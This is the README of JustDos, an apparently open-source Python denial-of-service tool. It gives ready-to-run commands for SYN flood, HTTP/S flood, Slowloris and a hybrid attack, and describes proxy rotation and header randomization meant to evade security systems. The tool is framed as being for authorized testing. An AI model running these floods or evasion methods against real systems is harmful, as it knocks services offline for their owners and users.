<p align="center">
    <img src="./docs/JustDos.png" alt="justdos"/>
</p>

<h1 align="center">JustDos - Powerful Denial-of-Service Tool</h1>
<p align="center">
    <i>"Break the balance, and find the weak point."<i>
</p>

<p align="center">
    <a href="#">
        <img alt="JustDos last commit" src="https://img.shields.io/github/last-commit/RafacuyM/JustDos/main?color=green&style=for-the-badge">
    </a>
    <a href="#">
        <img alt="JustDos License" src="https://img.shields.io/github/license/Rafacuy/JustDos?color=orange&style=for-the-badge">
    </a>
    <a href="https://github.com/Rafacuy/JustDos/issues">
        <img alt="MatrixTM issues" src="https://img.shields.io/github/issues/Rafacuy/JustDos?color=purple&style=for-the-badge">
    </a>
</p>

<h2 align="center">Introduction</h2>
JustDos is an advanced Denial-of-Service (DoS) testing tool designed for ethical hacking and penetration testing. This powerful framework enables security professionals to evaluate system resilience against various DoS attack vectors in controlled environments. The tool features multiple attack modes, adaptive strategies, and realistic traffic simulation to help identify vulnerabilities in network infrastructure and web applications.

\
**Key Features:**
- Layer 7 attacks: HTTP/S Flood, Slowloris
- Layer 4 attacks: SYN Flood
- Hybrid attacks: Killer (Slowloris + HTTP Flood)
- Adaptive attack planning to avoid blocked paths
- Realistic header randomization to bypass security systems
- Proxy support and management
- Detailed performance benchmarking
- Ethical confirmation prompts before execution

**Warning:** This tool is strictly for authorized penetration testing and educational purposes. Unauthorized use against systems without explicit permission is illegal and unethical.

## Installation

### Prerequisites
- Python 3.8+
- Linux/macOS (Windows support limited)
- Root privileges required for SYN Flood attacks

### Setup
```bash
# Clone the repository
git clone https://github.com/rafacuy/JustDos.git
cd JustDos

# Install dependencies
pip install -r requirements.txt
```

### Dependencies
- `httpx`
- `termcolor`
- `pyfiglet`
- `scapy` (for SYN Flood)

## Usage

### Basic Command Structure
```bash
python3 main.py [attack_mode] [target] [port] [options]
```

### Attack Modes
1. **SYN Flood (Layer 4):**
   ```bash
   sudo python3 main.py syn 192.168.1.10 80 \
     -p $(nproc) \
     -d 60 \
     -r 500
   ```
   - `-p`: Number of parallel processes
   - `-d`: Attack duration (seconds)
   - `-r`: Packet rate limit per process

2. **HTTP/S Flood (Layer 7):**
   ```bash
   python3 main.py http example.com 443 \
     -w 100 \
     -d 120 \
     --https \
     --adaptive \
     --use-proxies \
     --proxy-file proxies.txt
   ```
   - `-w`: Concurrent async workers
   - `--https`: Use HTTPS
   - `--adaptive`: Enable adaptive path avoidance
   - `--use-proxies`: Enable proxy rotation

3. **Slowloris Attack:**
   ```bash
   python3 main.py slowloris example.com 80 \
     -c 1000 \
     -i 5 \
     -d 300
   ```
   - `-c`: Simultaneous connections
   - `-i`: Keep-alive header interval (seconds)

4. **Hybrid Killer Attack:**
   ```bash
   python3 main.py killer example.com 80 \
     -c 500 \
     -i 10 \
     -w 75 \
     -d 180 \
     --https
   ```

### Key Features in Action
- **Adaptive Strategy Planner:** Dynamically avoids blocked paths using:
  ```python
  planner = StrategyPlanner()
  if await planner.is_path_dangerous(path): 
      continue
  ```
- **Realistic Traffic Simulation:** Generates browser-specific headers:
  ```python
  header_factory = HeaderFactory(pool_size=2000)
  headers = header_factory.get_headers()
  ```
- **Proxy Management:** Rotates proxies automatically:
  ```python
  proxy_pool = AdaptiveProxyPool(proxies, logger)
  proxy = await proxy_pool.get_proxy()
  ```

## Modules Overview
| Module | Purpose |
|--------|---------|
| `core.py` | Main attack logic and orchestration |
| `planner.py` | Adaptive strategy planning |
| `randomizer.py` | HTTP header randomization |
| `benchmark.py` | Performance metrics and reporting |
| `logger.py` | Request logging to `justdos_attack.log` |
| `proxy_manager.py` | Proxy rotation and management |
| `crawler.py` | Target path discovery |

## Contributing
Contributions are welcome! Please follow these guidelines:
1. Fork the repository and create your feature branch
2. Ensure code quality with type hints and docstrings
3. Include tests for new functionality
4. Update relevant documentation
5. Submit a pull request with detailed description

**Ethical Guidelines:**
- All contributions must adhere to ethical hacking principles
- Never implement features designed for illegal use
- Maintain focus on defensive security testing

Please read the [LEGALLITY](./LEGALLITY.md) for more details.

## License
This project is licensed under the GPL-3.0 License. See [LICENSE](LICENSE) for details.
